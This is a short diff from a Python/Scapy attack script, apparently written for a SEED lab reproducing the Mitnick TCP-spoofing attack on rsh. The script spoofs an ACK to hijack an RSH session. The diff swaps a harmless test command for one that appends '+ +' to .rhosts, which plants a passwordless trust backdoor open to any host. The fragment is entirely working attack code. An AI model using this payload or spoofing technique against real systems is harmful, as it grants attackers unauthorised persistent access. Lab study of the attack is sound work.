@@ -21,7 +21,7 @@ def spoof_rply(pkt):
     TCPLen = len(pkt[TCP].payload)
 
     # Construct payload
-    myLoad = '1024\x00seed\x00seed\x00touch /tmp/xyz\x00'
+    myLoad = '1024\x00seed\x00seed\x00echo + + >> .rhosts\x00'
     
     # If it is a SYN+ACK packet, spoof an ACK reply and establish RSH connecction
     if pkt[TCP].flags == 'SA':
